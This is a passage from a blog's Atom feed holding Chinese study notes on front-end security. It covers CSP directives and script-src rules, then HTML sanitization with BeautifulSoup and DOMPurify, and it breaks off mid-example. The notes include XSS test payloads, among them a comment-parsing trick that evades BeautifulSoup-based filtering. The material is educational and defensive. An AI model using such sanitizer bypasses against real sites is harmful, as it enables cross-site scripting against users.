253af31979352b47edc98de0ceeabc08264d8828f4ffc535f38648a299e603ca04abeace2f9f1b3fd0fd199edf5c5554af513b6582719f89977a162e6e5df7e3fb315064285b9208696e491f61b8338b4f730df748dfd9637659638826c2d30177b291fe72d18d46a7235d5158afa7005e44e2e2f6c67674ff22292287fb0fd9872a539a85722894d95d77d1ffce470931f61248da70a66165145c59f66f1068cf3bdcca0415776379bad67489d1da98fac22255101bdd5151dbcd3f8c91ef58c4fafc7b618fd15f10b64d8868599b5e88cc4fe78caa369386cfc363e95674b7daf26a260cd5b5d9201c0b3b237d7c1b20b57d6b2e32e8290f8bbc44544ba5f8dbd3c7eba2612e92d3a6a717b4935e8a01eadb4bf783e50f537eb293be84653bce6a3a29055dbebc7753a5d26b855d9a9986c01b622e6573929a30087be357902d58fe5ebf4e0600be66703ee337676167d7d68bf6a023fd7995c2a8438e8f2eb5a49b469d28922d3cdec31544abda1fd0e58541fd1c718ce0eeb746f8dfc228f3716429ec54d116e067456c340d2a9b65837671b9c6d6e5eebfd8de0e85178194fd5bd3442c5ebc8adcae1239071187cb756aa5459d03a8021f4dffa8809d061ba404a9c38532136fb7888fba95bf29e3f9471cb5b96ee059f19e232a824417a88560b76aa03e3f6b10a6a02ee2e28579d14a1eca1ebed65d0eef3896780aaabfc0c3e9e422b48a653e90f498462444feb5acf2ef51dc579e60dbe1c3f942ae9915c7b6d9a9ec1a7628d762bbba9eef83971d25bbf3b7779e57d1263271078c58b3decbf00c640d334c4a35f9efce71bf90714df7036969041065b88bc0401b461920aedf686e3e7320fbcbd504c4b2cb9d700840b6464f881e93a110e7142e453710c5aaf089ed04b79b27176c179385a152d65743031fd2a4fee2196ad402ce93f24dcda37cca9df0ff3bd8d17f84b43dd5350f7281a554231a0c8f4fb4c78f128f255834741d559e896562b850b8e2b0568ff15095f6be4a67add437fc02e235a54a469fc4edbda7df1be653cd9fb671d8b322f5090fb93a8e5f926bd51c8893a9bf8a34fd1b24357900f78999c8ae36eb7195916f396a8f4eb8c2a60877cbd04ffaf2f4beaa81a7cc810be56e1b185d171121de48e854d0be9d07b677a17e3462a0e29e67c038db8d8ff8c67f9cf19cdda9982082d3fa0208574b683b257d84aef2781697a76e906ef63eadad8a0be5c225c821fa56ac3365461e74027ed12a5959ce482e5120fd32e0d308d16a1ee119050c81abbc9cdbd28b40b0409c54bb222ebca41d7e42d99e5a402843711edb050241edebd35735b53fdd5a7d79f2181bd980a2855c42886de63e2b0c75e1cdff</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码阅读</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>前端安全5-CSP（笔记）</title>
    <link href="http://example.com/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-09-24T03:04:11.000Z</published>
    <updated>2023-10-01T17:14:16.211Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为绕过的方式太多，有时候一不小心就会写出一个含有xss漏洞的代码，这时候要怎么去防御。那么就是依靠CSP进行防御了</p><ul><li><a href="https://ithelp.ithome.com.tw/articles/10315612">https://ithelp.ithome.com.tw/articles/10315612</a><span id="more"></span><h2 id="Content-Security-Policy"><a href="#Content-Security-Policy" class="headerlink" title="Content Security Policy"></a>Content Security Policy</h2>网页要加上CSP策略有3种方法</li><li>HTTP Respond header加上 Content-Security-Policy</li><li>加上<code>meta</code>标签</li><li><h3 style="text-decoration: line-through;">iframe标签，在本章不讲</h3></li></ul><p>先看个简单的案例<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;none&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>上面的html并不会有弹窗，因为被csp策略阻止了<br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br><code>script-src &#39;none&#39;</code>的意思就是禁止任何脚本执行，包括</p><h2 id="CSP规则"><a href="#CSP规则" class="headerlink" title="CSP规则"></a>CSP规则</h2><p>在上面的例子就用了<code>script-src &#39;none&#39;</code>导致了任何的脚本都不会被执行，包括onerror那些<br><code>default-src</code>就是预设的指示，如果某个指示，例如<code>script-src</code>没有设置任何规则，那么就会使用<code>default-src</code>的规则。<br>但是有几个是不会使用<code>default-src</code>的内容的，如下</p><ul><li>base-uri</li><li>form-action</li><li>frame-ancestors</li><li>report-uri</li><li>sandbox</li></ul><p>详细内容请看<br><a href="https://content-security-policy.com/default-src/">https://content-security-policy.com/default-src/</a></p><p>还有其他的指示，我这里直接使用huli佬的<br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>下面两个链接是官方文档</p><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li><li><a href="https://content-security-policy.com">https://content-security-policy.com</a></li></ul><p>当然，每个指示都会有相应的规则，那么一般使用哪些规则呢，我这里也偷懒直接用huli佬的截图</p><p><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt></p><p>例如<code>script-src *</code>就相当于允许除了<code>data:</code>,<code>blob:</code>，还有<code>file:</code>,demo如下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src *&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">test.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>但是直接运行的话，就像下面的代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src *&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/4.png" alt></p><p>这种直接运行的还是不行。只能用加载js的方式<code>&lt;script src=xxx&gt;</code>。<br>想直接运行代码，还是得用<code>unsafe-inline</code></p><h3 id="script-src-规则"><a href="#script-src-规则" class="headerlink" title="script-src 规则"></a>script-src 规则</h3><h4 id="unsafe-inline"><a href="#unsafe-inline" class="headerlink" title="unsafe-inline"></a>unsafe-inline</h4><p>允许执行inline js<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;unsafe-inline&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h4 id="unsafe-eval"><a href="#unsafe-eval" class="headerlink" title="unsafe-eval"></a>unsafe-eval</h4><p>前一个策略允许执行js代码，但是不会运行动态执行js代码，也就是说<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;alert(1)&#x27;</span>)</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="string">&#x27;alert(1)&#x27;</span>)</span><br><span class="line"><span class="title class_">Function</span>(<span class="string">&#x27;&#x27;</span>)()</span><br></pre></td></tr></table></figure><br>类似这些<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;&quot;</span>&gt;</span><span class="comment">&lt;!-- 仍然需要unsafe-inline，不然不能执行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="string">&#x27;alert(1)&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h4 id="nonce-xxx"><a href="#nonce-xxx" class="headerlink" title="nonce-xxx"></a>nonce-xxx</h4><p>允许<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;nonce-123&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">123</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>不允许执行不一样的与csp中的nonce不一样的</p><h4 id="sha256-xxxx"><a href="#sha256-xxxx" class="headerlink" title="sha256-xxxx"></a>sha256-xxxx</h4><p>我这里用一段python代码完成这个，也方便以后的操作<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;alert(1)&quot;</span></span><br><span class="line">hash_object = hashlib.sha256(message.encode())</span><br><span class="line">hash_base64 = base64.b64encode(hash_object.digest())</span><br><span class="line"><span class="built_in">print</span>(hash_base64.decode())</span><br></pre></td></tr></table></figure><br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/5.png" alt></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行执行sha256一样的</p><h4 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;nonce-rjg103rj1298e&#x27; &#x27;strict-dynamic&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">rjg103rj1298e</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> element = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    element.<span class="property">src</span> = <span class="string">&#x27;test.js&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(element)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>从<code>nonce=rjg103rj1298e</code>这段生成的js代码也可以运行，因为<code>strict-dynamic</code></p><h2 id="CSP的配置"><a href="#CSP的配置" class="headerlink" title="CSP的配置"></a>CSP的配置</h2><p><a href="https://csp-evaluator.withgoogle.com">https://csp-evaluator.withgoogle.com</a><br>可以用这个网站查看csp策略是否有问题</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;因为绕过的方式太多，有时候一不小心就会写出一个含有xss漏洞的代码，这时候要怎么去防御。那么就是依靠CSP进行防御了&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10315612&quot;&gt;https://ithelp.ithome.com.tw/articles/10315612&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>前端安全4-Sanitization（笔记）</title>
    <link href="http://example.com/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A84-Sanitization%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A84-Sanitization%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-09-23T16:14:43.000Z</published>
    <updated>2023-09-24T03:00:23.948Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇主要讲讲xss的绕过和防御</p><ul><li><a href="https://ithelp.ithome.com.tw/articles/10315367">https://ithelp.ithome.com.tw/articles/10315367</a><span id="more"></span></li></ul><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>上一篇讲过了，编码在一些情况下是无法进行过滤xss的，下面是一些常见框架或语言过滤xss的方法</p><ul><li>前端：一般使用<code>innerText</code>来代替<code>innerHTML</code></li><li>Laravel： <code>&#123;&#123; $text &#125;&#125;</code>是编码的，<code>&#123;!! $text !!&#125;</code>是原本的</li><li>Jinja：<code>&#123;&#123; test &#125;&#125;</code> 是编码的，<code>&#123;&#123; text | safe &#125;&#125;</code>是原始格式</li></ul><p>但是有些时候，就是需要输出一些带有html的代码，这时候应该如何去过滤</p><h2 id="sanitize"><a href="#sanitize" class="headerlink" title="sanitize"></a>sanitize</h2><p>先来说说BeautifulSoup，当你用他进行解析html，想过滤一些东西的时候，就有可能会出现问题<br>先来看看简单的demo<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">html = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  &lt;div&gt;</span></span><br><span class="line"><span class="string">    test</span></span><br><span class="line"><span class="string">    &lt;script&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;img src=x onerror=alert(1)&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tree = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> tree.find_all():</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;name: <span class="subst">&#123;element.name&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;attrs: <span class="subst">&#123;element.attrs&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><br>这段代码的output是<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name: div</span><br><span class="line">attrs: &#123;&#125;</span><br><span class="line">name: script</span><br><span class="line">attrs: &#123;&#125;</span><br><span class="line">name: img</span><br><span class="line">attrs: &#123;<span class="string">&#x27;src&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;onerror&#x27;</span>: <span class="string">&#x27;alert(1)&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><br>但是当你遇到下面的代码<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">html = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  &lt;div&gt;</span></span><br><span class="line"><span class="string">    test</span></span><br><span class="line"><span class="string">    &lt;!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tree = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> tree.find_all():</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;name: <span class="subst">&#123;element.name&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;attrs: <span class="subst">&#123;element.attrs&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><br>这段的输出是<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name: div</span><br><span class="line">attrs: &#123;&#125;</span><br></pre></td></tr></table></figure><br>看上去好像没问题，因为这行代码看上去是注释<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</span></span><br></pre></td></tr></table></figure><br>但是其实，在浏览器的解析中碰到第一个<code>&gt;</code>的时候就已经闭合注释了，但是BeautifulSoup中，他是解析为到最后一个<code>&gt;</code>都是注释<br>这里有相应的ctf题</p><ul><li><a href="https://github.com/Seraphin-/ctf/blob/master/irisctf2023/feelingtagged.md">https://github.com/Seraphin-/ctf/blob/master/irisctf2023/feelingtagged.md</a></li><li><a href="https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/crocodilu#bypassing-html-sanitization">https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/crocodilu#bypassing-html-sanitization</a></li></ul><h2 id="DOMPurify"><a href="#DOMPurify" class="headerlink" title="DOMPurify"></a>DOMPurify</h2><p>基本用法如下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html);</span><br></pre></td></tr></table></figure><br>他并不是单纯的过滤或者编码<br>该套件运行一些安全的tag，和一些安全的attr<br>当然可以通过配置增加一些tag或者attr，如下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="attr">ADD_TAGS</span>: [<span class="string">&#x27;iframe&#x27;</span>],</span><br><span class="line">  <span class="attr">ADD_ATTR</span>: [<span class="string">&#x27;src&#x27;</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> html = <span class="string">&#x27;&lt;div&gt;&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html, config))</span><br><span class="line"><span class="comment">// &lt;div&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line">html = <span class="string">&#x27;&lt;div&gt;&lt;iframe src=https://example.com&gt;&lt;/iframe&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html, config))</span><br><span class="line"><span class="comment">// &lt;div&gt;&lt;iframe src=&quot;https://example.com&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A84-Sanitization%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>但是可以看到，对于不安全的代码，仍然会过滤掉，但是在一些情况下也不会被过滤掉<br>就比如下面这种<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 